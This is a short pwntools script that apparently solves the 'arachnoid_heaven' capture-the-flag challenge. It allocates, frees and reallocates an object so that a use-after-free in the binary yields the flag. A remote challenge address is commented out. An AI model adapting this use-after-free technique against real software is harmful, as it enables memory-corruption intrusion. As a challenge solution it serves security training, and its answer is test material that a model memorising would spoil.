from pwn import *

# r = remote('167.172.58.213', 31697)
r = process('./arachnoid_heaven')

# Crafting arachnoid_A with a random name
r.sendlineafter('> ', '1')
r.sendlineafter('Name: ', 'random')

# Deleting arachnoid_A
r.sendlineafter('> ', '2')
r.sendlineafter('Index: ', '0')

# Crafting arachnoid_B with the name "sp1d3y"
r.sendlineafter('> ', '1')
r.sendlineafter('Name: ', 'sp1d3y')

# Obtaining the flag with arachnoid_A
r.sendlineafter('> ', '4')
r.sendlineafter('Arachnoid: ', '0')

# Getting the flag
flag = r.recvall(timeout=1).split(b'\n')[1].decode()
log.success(f"FLAG : {flag}")